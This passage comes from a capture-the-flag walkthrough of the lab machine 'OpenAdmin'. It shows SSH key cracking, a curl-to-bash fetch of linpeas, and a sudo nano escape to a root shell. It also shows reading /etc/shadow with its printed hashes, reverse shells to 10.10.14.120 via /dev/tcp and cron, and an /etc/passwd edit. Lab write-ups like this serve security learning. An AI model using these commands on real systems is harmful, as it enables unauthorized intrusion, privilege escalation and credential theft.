ssh.key:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
```

	cp /usr/share/wordlists/rockyou.txt.gz .
	gunzip rockyou.txt.gz
	john --wordlist=rockyou.txt openadmin.ssh	// bloodninjas
	ssh -i ssh.key joanna@10.129.183.214		// bloodninjas

We knew that it was Joanna's key bacause of the shell_exec PHP function:

	less /var/www/internal/main.php
	
```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
```

	ps -ef | grep joanna

```bash
root      1555  1197  0 09:49 ?        00:00:00 sshd: joanna [priv]
joanna    1563     1  0 09:49 ?        00:00:00 /lib/systemd/systemd --user
joanna    1575  1563  0 09:49 ?        00:00:00 (sd-pam)
joanna    1691  1555  0 09:49 ?        00:00:00 sshd: joanna@pts/0
joanna    1695  1691  0 09:49 pts/0    00:00:00 -bash
joanna    1761  1695  0 09:55 pts/0    00:00:00 ps -ef
joanna    1762  1695  0 09:55 pts/0    00:00:00 grep --color=auto joanna
```

Get user.txt key:

	find .
	cat user.txt	// ef984c9aa2b7d7cd5d66e9be16a71edc

Look for files joanna owns:

	find . -type f
	history | grep find
	find / -user joanna -ls 2>/dev/null
	
```bash
   /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service
     3668      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
     3669      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
     3671      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.clone_children
     3672      0 drwxr-xr-x   2 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope
     3673      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
     3674      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
     3675      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
     3676      0 -rw-r--r--   1 joanna   joanna          0 Dec 18 10:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
	 
   286762      4 drwxr-x---   5 joanna   joanna       4096 Dec 18 09:48 /home/joanna
   286770      4 drwx------   2 joanna   joanna       4096 Nov 23  2019 /home/joanna/.ssh
   282759      4 -rw-r--r--   1 joanna   joanna        398 Nov 23  2019 /home/joanna/.ssh/id_rsa.pub
   282831      4 -rw-r--r--   1 joanna   joanna        398 Nov 23  2019 /home/joanna/.ssh/authorized_keys
   282758      4 -rw-------   1 joanna   joanna       1766 Nov 23  2019 /home/joanna/.ssh/id_rsa
   282824      4 -rw-r--r--   1 joanna   joanna       3771 Nov 22  2019 /home/joanna/.bashrc
   286764      4 drwx------   2 joanna   joanna       4096 Jul 27 06:12 /home/joanna/.cache
   282843      0 -rw-r--r--   1 joanna   joanna          0 Jul 27 06:12 /home/joanna/.cache/motd.legal-displayed
   282825      4 -rw-r--r--   1 joanna   joanna        807 Nov 22  2019 /home/joanna/.profile
   286767      4 drwx------   3 joanna   joanna       4096 Nov 22  2019 /home/joanna/.gnupg
   286768      4 drwx------   2 joanna   joanna       4096 Nov 22  2019 /home/joanna/.gnupg/private-keys-v1.d
   282755      4 -r--------   1 joanna   joanna         33 Dec 18 09:48 /home/joanna/user.txt
   282827      0 lrwxrwxrwx   1 joanna   joanna          9 Nov 22  2019 /home/joanna/.bash_history -> /dev/null
   282826      4 -rw-r--r--   1 joanna   joanna        220 Nov 22  2019 /home/joanna/.bash_logout
   ```

	groups	// joanna internal - maybe she was a part of lxcfs
	find / -user joanna -ls 2>/dev/null | grep -v lxcfs	// grep -v inverts matching
	find / -user joanna -ls 2>/dev/null | grep -v 'lxcfs\|proc'
	find / -user joanna -ls 2>/dev/null | grep -v 'lxcfs\|proc\|/sys/'	// grab only useful lines
	
```bash
2      0 drwx------   4 joanna   joanna         80 Dec 18 09:49 /run/user/1001
4      0 drwxr-xr-x   2 joanna   joanna         80 Dec 18 09:49 /run/user/1001/systemd
6      0 srwxrwxr-x   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/systemd/private
5      0 srwxrwxr-x   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/systemd/notify
3      0 drwx------   2 joanna   joanna        140 Dec 18 09:49 /run/user/1001/gnupg
11     0 srw-------   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/gnupg/S.gpg-agent.browser
10     0 srw-------   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/gnupg/S.dirmngr
9      0 srw-------   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/gnupg/S.gpg-agent
8      0 srw-------   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/gnupg/S.gpg-agent.extra
7      0 srw-------   1 joanna   joanna          0 Dec 18 09:49 /run/user/1001/gnupg/S.gpg-agent.ssh
3      0 crw--w----   1 joanna   tty      136,   0 Dec 18 10:23 /dev/pts/0
286762      4 drwxr-x---   5 joanna   joanna       4096 Dec 18 09:48 /home/joanna
286770      4 drwx------   2 joanna   joanna       4096 Nov 23  2019 /home/joanna/.ssh
282759      4 -rw-r--r--   1 joanna   joanna        398 Nov 23  2019 /home/joanna/.ssh/id_rsa.pub
282831      4 -rw-r--r--   1 joanna   joanna        398 Nov 23  2019 /home/joanna/.ssh/authorized_keys
282758      4 -rw-------   1 joanna   joanna       1766 Nov 23  2019 /home/joanna/.ssh/id_rsa
282824      4 -rw-r--r--   1 joanna   joanna       3771 Nov 22  2019 /home/joanna/.bashrc
286764      4 drwx------   2 joanna   joanna       4096 Jul 27 06:12 /home/joanna/.cache
282843      0 -rw-r--r--   1 joanna   joanna          0 Jul 27 06:12 /home/joanna/.cache/motd.legal-displayed
282825      4 -rw-r--r--   1 joanna   joanna        807 Nov 22  2019 /home/joanna/.profile
286767      4 drwx------   3 joanna   joanna       4096 Nov 22  2019 /home/joanna/.gnupg
286768      4 drwx------   2 joanna   joanna       4096 Nov 22  2019 /home/joanna/.gnupg/private-keys-v1.d
282755      4 -r--------   1 joanna   joanna         33 Dec 18 09:48 /home/joanna/user.txt
282827      0 lrwxrwxrwx   1 joanna   joanna          9 Nov 22  2019 /home/joanna/.bash_history -> /dev/null
282826      4 -rw-r--r--   1 joanna   joanna        220 Nov 22  2019 /home/joanna/.bash_logout
```

	ls -la

Escalate privileges:

	curl 10.10.14.120/linpeas.sh | bash

```
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

	sudo /bin/nano /opt/priv

There's probably a hotkey to escape nano

	^o			// write out
	/root/.ssh	// write to /root/.ssh, trying to open an out file. We can probably write to an SSH key but we don't want to break one.
	^r			// read file, /root/.ssh/id_rsa
	^r			// read /root/root.txt. 9e6497b41dc08c08118ac52c567648e3
	^r			// read /etc/shadow

```
root:$6$BGk6CBPE$FoDCUgY.1pnYDkqDr4.yNm4jQqnnG7side9P6ApdQWWqLr6t1DHq/iXuNF7F0fkivSYXajUp/bK2cw/D/3ubU/:18222:0:99999:7:::
jimmy:$6$XnCB2K/6$QALmpgLWhDwUjcNldzgtafb6Tt1dT.uyIfxdhDYOVGdlNgIyDX89hz29P.aDQM9OBSSsI2dJGUYYTmQtdb2zw.:18222:0:99999:7:::
mysql:!:18221:0:99999:7:::
joanna:$6$gmFfLksM$XJl08bIFRUki/Lecq8RKFzFFvleGn9CjiqrQxU4n/l6JZe/FSRbe0I/W3L86yWibCJejfrMzgH3HvUezxhCWI0:18222:0:99999:7:::
```

	^r			// /var/spool/cron/crontabs/root
	
	* * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'
	
Why isn't this working? Check GTFOBins.  [^4]

This can be used to break out from restricted environments by spawning an interactive system shell:

```
nano
^R^X
reset; sh 1>&0 2>&0
```
    
The SPELL environment variable can be used in place of the -s option if the command line cannot be changed:
    
```
nano -s /bin/sh
/bin/sh
^T
```

	^R^X
	reset; sh 1>&0 2>&0	// # we got root

Not sure why the crontabs reverse shell isn't working:

	iptables -L

```
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

	bash
	bash -i >& /dev/tcp/10.10.14.120/9001 0>&1				// we get a reverse shell to our nc listener on joanna
	bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'	// we get a reverse shell to our nc listener on joanna

Not sure why the crontabs reverse shell isn't working but since we don't care about security we can just give the www-data user a shell:

	vi /etc/passwd
	
```
From: 	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
To:		www-data:x:33:33:www-data:/var/www:/bin/bash
```

	su - www-data -c bash
	nc -lvnp 9001	// on attacker machine
	bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'	// we get a reverse shell to our nc listener on www-data

References
----
<iframe width="560" height="315" src="https://www.youtube.com/embed/fdD-JTlkd3k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[^1]: https://github.com/Tib3rius/privilege-escalation-awesome-scripts-suite
[^2]: https://hashes.org / https://hashmob.net
[^3]: https://www.whitehatsec.com/blog/magic-hashes/
[^4]: https://gtfobins.github.io/

- [[]]